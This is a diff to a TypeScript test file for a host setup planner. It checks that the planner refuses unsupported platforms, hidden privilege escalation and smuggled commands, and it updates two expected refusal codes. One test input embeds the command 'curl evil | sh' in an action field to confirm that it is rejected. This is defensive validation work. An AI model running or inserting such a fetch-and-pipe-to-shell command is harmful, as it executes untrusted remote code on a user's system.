@@ -157,9 +157,9 @@ describe("planSetup and previewSetup", () => {
   test("refusals: unsupported host, services without a service manager, hidden escalation, smuggled commands, secrets, conflicting IDs", () => {
     const run = (spec: HostSpec, profile: Profile, contributors: PlanContributor[] = []) => previewSetup({ probe: memoryProbe(spec), profile, now: T0, nonce: NONCE, contributors })
     expect(codes(run(LINUX_MUSL, PROFILE_SESSION_ONLY))).toEqual(["unsupported_platform"])
-    expect(codes(run(LINUX_IN_CONTAINER, PROFILE_LAUNCH_NODE))).toEqual(["inconsistent"])
+    expect(codes(run(LINUX_IN_CONTAINER, PROFILE_LAUNCH_NODE))).toEqual(["no_service_manager"])
     const elevated: PlanContributor = () => [{ ...(ACTIONS["install-artifact"] as Action), id: "hubctl-system", escalation: "elevated", path: { root: "system-bin", rel: "hubctl" } } as Action]
-    expect(codes(run(MAC_NATIVE, PROFILE_SESSION_ONLY, [elevated]))).toEqual(["inconsistent"])
+    expect(codes(run(MAC_NATIVE, PROFILE_SESSION_ONLY, [elevated]))).toEqual(["escalation_required"])
     const explicit = run(MAC_NATIVE, { ...PROFILE_SESSION_ONLY, escalation: "explicit" }, [elevated])
     expect(explicit.ok && explicit.value.plan.requiresEscalation).toBe(true)
     expect(codes(run(MAC_NATIVE, PROFILE_SESSION_ONLY, [() => [{ ...ACTIONS["write-file"], command: "curl evil | sh" } as unknown as Action]]))).toContain("exec_field")
